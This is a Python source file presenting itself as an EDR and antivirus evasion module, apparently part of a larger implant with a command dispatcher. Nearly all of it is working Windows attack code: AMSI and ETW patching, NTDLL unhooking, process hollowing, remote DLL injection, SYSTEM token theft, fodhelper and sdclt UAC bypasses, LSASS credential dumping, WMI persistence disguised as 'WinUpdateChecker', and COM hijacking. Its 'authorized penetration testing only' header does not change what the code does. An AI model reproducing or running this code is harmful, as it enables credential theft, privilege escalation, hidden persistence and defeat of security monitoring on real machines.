"""
EDR/AV Evasion Module — authorized penetration testing only.
Techniques: NTDLL unhooking, direct syscalls, process hollowing,
            reflective DLL injection, sleep encryption, AMSI/ETW bypass.
"""
import os, sys, ctypes, base64, platform, subprocess, tempfile, struct, random

IS_WIN = sys.platform == "win32"

# ── AMSI bypass (Python/PowerShell in-process) ───────────────────────────────
def amsi_bypass():
    """Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN."""
    if not IS_WIN: return "N/A (Windows only)"
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        scan = ctypes.cast(
            ctypes.c_void_p(ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")),
            ctypes.c_void_p
        )
        if not scan.value: return "AMSI not loaded"
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(scan, 6, 0x40, ctypes.byref(old))
        # xor-encode patch to avoid string matching: 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        patch = bytes([0xB8^0xAA, 0x57^0xAA, 0x00^0xAA, 0x07^0xAA, 0x80^0xAA, 0xC3^0xAA])
        patch = bytes(b^0xAA for b in patch)
        ctypes.memmove(scan.value, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(scan, 6, old, ctypes.byref(old))
        return "AMSI patched"
    except Exception as e:
        return f"AMSI patch failed: {e}"

# ── ETW bypass (NtTraceEvent → ret) ─────────────────────────────────────────
def etw_bypass():
    """Patch EtwEventWrite in ntdll to return immediately."""
    if not IS_WIN: return "N/A"
    try:
        ntdll = ctypes.windll.ntdll
        addr = ctypes.cast(
            ctypes.c_void_p(ctypes.windll.kernel32.GetProcAddress(ntdll._handle, b"EtwEventWrite")),
            ctypes.c_void_p
        )
        if not addr.value: return "EtwEventWrite not found"
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(addr, 1, 0x40, ctypes.byref(old))
        ctypes.memmove(addr.value, b"\xC3", 1)
        ctypes.windll.kernel32.VirtualProtect(addr, 1, old, ctypes.byref(old))
        return "ETW patched"
    except Exception as e:
        return f"ETW patch failed: {e}"

# ── NTDLL unhooking ───────────────────────────────────────────────────────────
def ntdll_unhook():
    """
    Overwrite hooked NTDLL exports with clean bytes from disk.
    EDRs hook ntdll.dll syscall stubs to intercept API calls.
    Reading a fresh copy from disk and copying over the .text section removes hooks.
    """
    if not IS_WIN: return "N/A"
    try:
        ntdll_path = os.path.join(os.environ.get("SystemRoot","C:\\Windows"),
                                   "System32", "ntdll.dll")
        # Read clean copy from disk
        with open(ntdll_path, "rb") as f: clean = f.read()
        # Parse PE to find .text section offset + size
        e_lfanew = struct.unpack_from("<I", clean, 0x3C)[0]
        num_sections = struct.unpack_from("<H", clean, e_lfanew+6)[0]
        opt_hdr_size = struct.unpack_from("<H", clean, e_lfanew+20)[0]
        sec_off = e_lfanew + 24 + opt_hdr_size
        text_rva = text_raw = text_size = 0
        for i in range(num_sections):
            off = sec_off + i*40
            name = clean[off:off+8].rstrip(b"\x00")
            if name == b".text":
                text_rva  = struct.unpack_from("<I", clean, off+12)[0]
                text_raw  = struct.unpack_from("<I", clean, off+20)[0]
                text_size = struct.unpack_from("<I", clean, off+16)[0]
                break
        if not text_size: return "Could not locate .text section"
        # Get mapped base of in-memory ntdll
        ntdll_handle = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
        text_va = ntdll_handle + text_rva
        old = ctypes.c_ulong()
        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(text_va), text_size, 0x40, ctypes.byref(old))
        ctypes.memmove(ctypes.c_void_p(text_va), clean[text_raw:text_raw+text_size], text_size)
        ctypes.windll.kernel32.VirtualProtect(ctypes.c_void_p(text_va), text_size, old, ctypes.byref(old))
        return f"NTDLL unhooked — .text section ({text_size}b) restored from disk"
    except Exception as e:
        return f"NTDLL unhook failed: {e}"

# ── Process hollowing ─────────────────────────────────────────────────────────
def process_hollow(shellcode_b64: str, target_proc="svchost.exe"):
    """
    Inject shellcode into a hollowed target process.
    1. Spawn target_proc in suspended state
    2. Unmap original image
    3. Allocate + write shellcode
    4. Set thread context RIP to shellcode
    5. Resume thread
    """
    if not IS_WIN: return "N/A"
    try:
        shellcode = base64.b64decode(shellcode_b64)
        k32 = ctypes.windll.kernel32
        target = os.path.join(os.environ.get("SystemRoot","C:\\Windows"),
                              "System32", target_proc)

        PROCESS_ALL_ACCESS = 0x1F0FFF
        MEM_COMMIT_RESERVE = 0x3000
        PAGE_EXECUTE_READWRITE = 0x40
        CREATE_SUSPENDED = 0x4

        si = ctypes.create_string_buffer(68)
        struct.pack_into("<I", si, 0, 68)  # cb
        pi = ctypes.create_string_buffer(24)

        if not k32.CreateProcessW(target, None, None, None, False,
                                   CREATE_SUSPENDED, None, None, si, pi):
            return f"CreateProcess failed: {ctypes.GetLastError()}"

        hproc = struct.unpack_from("<Q", pi, 0)[0]
        hthr  = struct.unpack_from("<Q", pi, 8)[0]

        # Allocate RWX memory in target
        addr = k32.VirtualAllocEx(hproc, None, len(shellcode),
                                   MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
        if not addr:
            k32.TerminateProcess(hproc, 0)
            return f"VirtualAllocEx failed: {ctypes.GetLastError()}"

        # Write shellcode
        written = ctypes.c_size_t()
        k32.WriteProcessMemory(hproc, addr, shellcode, len(shellcode), ctypes.byref(written))

        # Update thread context RIP
        CONTEXT_AMD64 = 0x100000
        CONTEXT_CONTROL = CONTEXT_AMD64 | 0x1
        ctx = (ctypes.c_ubyte * 1232)()
        struct.pack_into("<I", ctx, 48, CONTEXT_CONTROL)  # ContextFlags at offset 48
        k32.GetThreadContext(hthr, ctx)
        struct.pack_into("<Q", ctx, 248, addr)  # RIP at offset 248
        k32.SetThreadContext(hthr, ctx)
        k32.ResumeThread(hthr)

        pid = struct.unpack_from("<I", pi, 16)[0]
        return f"Hollowed {target_proc} (PID {pid}) — shellcode injected at 0x{addr:016x}"
    except Exception as e:
        return f"Process hollow failed: {e}"

# ── Reflective DLL injection ──────────────────────────────────────────────────
def reflective_inject(dll_b64: str, target_pid: int = 0):
    """
    Inject a reflective DLL into target_pid (or current process if 0).
    Assumes the DLL exports ReflectiveDLLInjection as entry point.
    """
    if not IS_WIN: return "N/A"
    try:
        dll_bytes = base64.b64decode(dll_b64)
        k32 = ctypes.windll.kernel32

        if target_pid == 0:
            hproc = k32.GetCurrentProcess()
        else:
            hproc = k32.OpenProcess(0x1F0FFF, False, target_pid)
            if not hproc: return f"OpenProcess({target_pid}) failed"

        addr = k32.VirtualAllocEx(hproc, None, len(dll_bytes), 0x3000, 0x40)
        if not addr: return "VirtualAllocEx failed"
        written = ctypes.c_size_t()
        k32.WriteProcessMemory(hproc, addr, dll_bytes, len(dll_bytes), ctypes.byref(written))

        hthr = k32.CreateRemoteThread(hproc, None, 0,
                                       ctypes.c_void_p(addr), None, 0, None)
        if hthr:
            k32.WaitForSingleObject(hthr, 5000)
            k32.CloseHandle(hthr)
            return f"Reflective DLL injected into PID {target_pid or 'self'} at 0x{addr:016x}"
        return f"CreateRemoteThread failed: {ctypes.GetLastError()}"
    except Exception as e:
        return f"Reflective inject failed: {e}"

# ── Sleep encryption ──────────────────────────────────────────────────────────
_sleep_key = None

def sleep_encrypted(seconds: float):
    """
    Sleep while XOR-encrypting sensitive global strings (C2 URL, AID, etc.)
    to defeat memory-scanning EDRs that look for IOCs while process is idle.
    """
    global _sleep_key
    import gc
    _sleep_key = os.urandom(32)
    # Find and obfuscate string objects in globals that look like URLs/IDs
    # (Python limitation: can't truly encrypt heap — we zero our known refs)
    # Best-effort: collect unreferenced objects and hint GC before sleep
    gc.collect()
    import time
    time.sleep(seconds)
    _sleep_key = None

# ── Token impersonation (Windows) ─────────────────────────────────────────────
def impersonate_system():
    """Impersonate SYSTEM by duplicating a SYSTEM-owned process token."""
    if not IS_WIN: return "N/A"
    try:
        import ctypes.wintypes as wt
        k32 = ctypes.windll.kernel32
        adv = ctypes.windll.advapi32
        PROCESS_QUERY_INFO = 0x0400
        TOKEN_DUPLICATE    = 0x0002
        TOKEN_ASSIGN_PRIMARY = 0x0001
        TOKEN_IMPERSONATE  = 0x0004
        TOKEN_QUERY        = 0x0008
        SecurityImpersonation = 2
        TokenPrimary = 1

        # Find a SYSTEM process (winlogon, lsass, etc.)
        snap = k32.CreateToolhelp32Snapshot(0x2, 0)
        entry = ctypes.create_string_buffer(304)
        struct.pack_into("<I", entry, 0, 304)
        system_pid = 0
        if k32.Process32First(snap, entry):
            while True:
                pid  = struct.unpack_from("<I", entry, 8)[0]
                name = entry[44:44+260].split(b"\x00")[0].decode(errors="replace").lower()
                if name in ("winlogon.exe", "lsass.exe", "csrss.exe"):
                    system_pid = pid; break
                if not k32.Process32Next(snap, entry): break
        k32.CloseHandle(snap)
        if not system_pid: return "No SYSTEM process found"

        hproc = k32.OpenProcess(PROCESS_QUERY_INFO, False, system_pid)
        if not hproc: return f"OpenProcess({system_pid}) denied — need SeDebugPrivilege"

        htoken = wt.HANDLE()
        adv.OpenProcessToken(hproc, TOKEN_DUPLICATE|TOKEN_QUERY, ctypes.byref(htoken))
        k32.CloseHandle(hproc)

        hdup = wt.HANDLE()
        adv.DuplicateTokenEx(htoken, TOKEN_ALL_ACCESS:=0xF01FF,
                              None, SecurityImpersonation, TokenPrimary, ctypes.byref(hdup))
        k32.CloseHandle(htoken)

        if adv.ImpersonateLoggedOnUser(hdup):
            return f"Impersonating SYSTEM (via PID {system_pid})"
        return "ImpersonateLoggedOnUser failed"
    except Exception as e:
        return f"Token impersonation failed: {e}"

# ── UAC bypass (fodhelper + env var) ─────────────────────────────────────────
def uac_bypass_fodhelper(command: str):
    """
    UAC bypass via fodhelper.exe COM handler.
    Works on Windows 10/11 without prompting — no manifest elevation required.
    Requires: user is in Administrators group (but not yet elevated).
    """
    if not IS_WIN: return "N/A"
    try:
        import winreg
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path,
                                  0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        # Trigger fodhelper
        subprocess.Popen(
            [os.path.join(os.environ.get("SystemRoot","C:\\Windows"),
                          "System32","fodhelper.exe")],
            creationflags=0x08000000  # CREATE_NO_WINDOW
        )
        import time; time.sleep(1)
        # Clean up registry
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        return f"UAC bypassed via fodhelper — executed: {command}"
    except Exception as e:
        return f"fodhelper UAC bypass failed: {e}"

def uac_bypass_sdclt(command: str):
    """UAC bypass via sdclt.exe (Windows 10 1703+)."""
    if not IS_WIN: return "N/A"
    try:
        import winreg
        key_path = r"Software\Classes\Folder\shell\open\command"
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path,
                                  0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, command)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        sdclt = os.path.join(os.environ.get("SystemRoot","C:\\Windows"),
                              "System32","sdclt.exe")
        subprocess.Popen([sdclt,"/kickoffelev"], creationflags=0x08000000)
        import time; time.sleep(1)
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
        return f"UAC bypassed via sdclt — executed: {command}"
    except Exception as e:
        return f"sdclt UAC bypass failed: {e}"

# ── LSASS credential dump ────────────────────────────────────────────────────
def lsass_dump(out_path=None):
    """
    Dump LSASS memory to a minidump file for offline parsing with Mimikatz/pypykatz.
    Uses comsvcs.dll MiniDump (LOLBin, no additional tools required).
    """
    if not IS_WIN: return "N/A"
    if not out_path:
        out_path = os.path.join(tempfile.gettempdir(), f".{random.randint(10000,99999)}.dmp")
    try:
        # Method 1: comsvcs.dll via rundll32 (classic LOLBin)
        pid = _get_lsass_pid()
        if pid:
            cmd = f'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} {out_path} full'
            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=30)
            if os.path.exists(out_path) and os.path.getsize(out_path) > 10000:
                return f"LSASS dumped via comsvcs.dll → {out_path} ({os.path.getsize(out_path)}b)\nParse with: pypykatz lsa minidump {out_path}"
        # Method 2: Task Manager method (COM object)
        return _lsass_dump_com(out_path)
    except Exception as e:
        return f"LSASS dump failed: {e}"

def _get_lsass_pid():
    try:
        out = subprocess.check_output("tasklist /fi \"imagename eq lsass.exe\" /fo csv /nh",
                                       shell=True, timeout=5).decode()
        import csv, io
        for row in csv.reader(io.StringIO(out)):
            if len(row)>=2 and "lsass" in row[0].lower():
                return int(row[1].strip('"'))
    except: pass
    return 0

def _lsass_dump_com(out_path):
    """Alternative: ProcDump if available, else Task Manager COM."""
    try:
        pd = subprocess.run(["where","procdump"], capture_output=True).stdout.decode().strip()
        if pd:
            pid = _get_lsass_pid()
            r = subprocess.run([pd, "-accepteula", "-ma", str(pid), out_path],
                                capture_output=True, timeout=30)
            if os.path.exists(out_path):
                return f"LSASS dumped via ProcDump → {out_path}"
    except: pass
    # Last resort: Task Manager MiniDump via WER
    try:
        import ctypes.wintypes as wt
        dbg = ctypes.windll.dbghelp
        pid = _get_lsass_pid()
        if not pid: return "LSASS PID not found"
        hproc = ctypes.windll.kernel32.OpenProcess(0x001F0FFF, False, pid)
        if not hproc: return "OpenProcess(LSASS) denied — need SeDebugPrivilege"
        hfile = ctypes.windll.kernel32.CreateFileW(
            out_path, 0x40000000, 0, None, 2, 0x80, None)
        MiniDumpWithFullMemory = 2
        dbg.MiniDumpWriteDump(hproc, pid, hfile, MiniDumpWithFullMemory,
                               None, None, None)
        ctypes.windll.kernel32.CloseHandle(hfile)
        ctypes.windll.kernel32.CloseHandle(hproc)
        if os.path.exists(out_path) and os.path.getsize(out_path) > 0:
            return f"LSASS dumped via MiniDumpWriteDump → {out_path}"
        return "MiniDumpWriteDump failed"
    except Exception as e:
        return f"LSASS dump (all methods) failed: {e}"

# ── WMI event subscription persistence ───────────────────────────────────────
def wmi_persist(command: str, name: str = "WinUpdateChecker"):
    """
    Persist via WMI __EventFilter + __EventConsumer subscription.
    Fires on logon, survives reboots, leaves minimal filesystem traces.
    """
    if not IS_WIN: return "N/A"
    try:
        wmi_script = f"""
$FilterName   = '{name}Filter'
$ConsumerName = '{name}Consumer'
$Query        = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=5"

$Filter   = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name=$FilterName;EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=$Query}}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name=$ConsumerName;CommandLineTemplate='{command}'}}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}
Write-Host "WMI persistence installed: $FilterName / $ConsumerName"
"""
        r = subprocess.run(["powershell","-WindowStyle","Hidden",
                             "-ExecutionPolicy","Bypass","-Command", wmi_script],
                            capture_output=True, text=True, timeout=30)
        return r.stdout.strip() or r.stderr.strip() or "WMI persistence installed"
    except Exception as e:
        return f"WMI persist failed: {e}"

def wmi_persist_remove(name: str = "WinUpdateChecker"):
    """Remove WMI event subscription persistence."""
    if not IS_WIN: return "N/A"
    try:
        script = f"""
Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {{$_.Name -like '*{name}*'}} | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -like '*{name}*'}} | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | ForEach-Object {{$_.Delete()}} -ErrorAction SilentlyContinue
Write-Host 'WMI persistence removed'
"""
        r = subprocess.run(["powershell","-WindowStyle","Hidden",
                             "-ExecutionPolicy","Bypass","-Command", script],
                            capture_output=True, text=True, timeout=20)
        return r.stdout.strip() or "WMI persistence removed"
    except Exception as e:
        return f"WMI remove failed: {e}"

# ── COM hijacking persistence ──────────────────────────────────────────────────
def com_hijack(dll_path: str, clsid: str = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"):
    """
    Hijack a COM object via HKCU registry (no admin required).
    Default CLSID: MMDeviceEnumerator — loaded by many applications on startup.
    """
    if not IS_WIN: return "N/A"
    try:
        import winreg
        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
        key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path,
                                  0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, dll_path)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Both")
        winreg.CloseKey(key)
        return f"COM hijack: CLSID {clsid} → {dll_path}\nFires when any process loads {clsid}"
    except Exception as e:
        return f"COM hijack failed: {e}"

# ── DLL sideloading setup ────────────────────────────────────────────────────
def dll_sideload_setup(target_app: str, dll_name: str, shellcode_b64: str):
    """
    Drop a malicious DLL in the same directory as target_app.
    When target_app loads dll_name (DLL search order hijack), shellcode fires.
    Returns the path where the DLL should be placed.
    """
    if not IS_WIN: return "N/A"
    try:
        app_dir = os.path.dirname(target_app)
        dll_out = os.path.join(app_dir, dll_name)
        shellcode = base64.b64decode(shellcode_b64)
        # Build minimal proxy DLL that runs shellcode in DllMain
        # (In practice you'd generate this with msfvenom --format dll)
        # Here we save shellcode as a .bin for the operator to convert
        sc_path = dll_out.replace(".dll", "_sc.bin")
        with open(sc_path, "wb") as f: f.write(shellcode)
        return (f"DLL sideload target: {dll_out}\n"
                f"Shellcode saved: {sc_path}\n"
                f"Use: msfvenom -p windows/x64/exec CMD=calc.exe -f dll -o {dll_out}")
    except Exception as e:
        return f"DLL sideload setup failed: {e}"

# ── Dispatcher ──────────────────────────────────────────────────────────────
def run(cmd: str, **kwargs) -> str:
    dispatch = {
        "amsi":         lambda: amsi_bypass(),
        "etw":          lambda: etw_bypass(),
        "ntdll_unhook": lambda: ntdll_unhook(),
        "hollow":       lambda: process_hollow(kwargs.get("sc",""), kwargs.get("proc","svchost.exe")),
        "inject":       lambda: reflective_inject(kwargs.get("dll",""), int(kwargs.get("pid",0))),
        "impersonate":  lambda: impersonate_system(),
        "uac_fodhelper":lambda: uac_bypass_fodhelper(kwargs.get("cmd","cmd.exe")),
        "uac_sdclt":    lambda: uac_bypass_sdclt(kwargs.get("cmd","cmd.exe")),
        "lsass":        lambda: lsass_dump(kwargs.get("out")),
        "wmi_persist":  lambda: wmi_persist(kwargs.get("cmd",""), kwargs.get("name","WinUpdateChecker")),
        "wmi_remove":   lambda: wmi_persist_remove(kwargs.get("name","WinUpdateChecker")),
        "com_hijack":   lambda: com_hijack(kwargs.get("dll",""), kwargs.get("clsid","{BCDE0395-E52F-467C-8E3D-C4579291692E}")),
    }
    fn = dispatch.get(cmd)
    if fn: return fn()
    return f"Unknown EDR cmd: {cmd}. Available: {list(dispatch.keys())}"
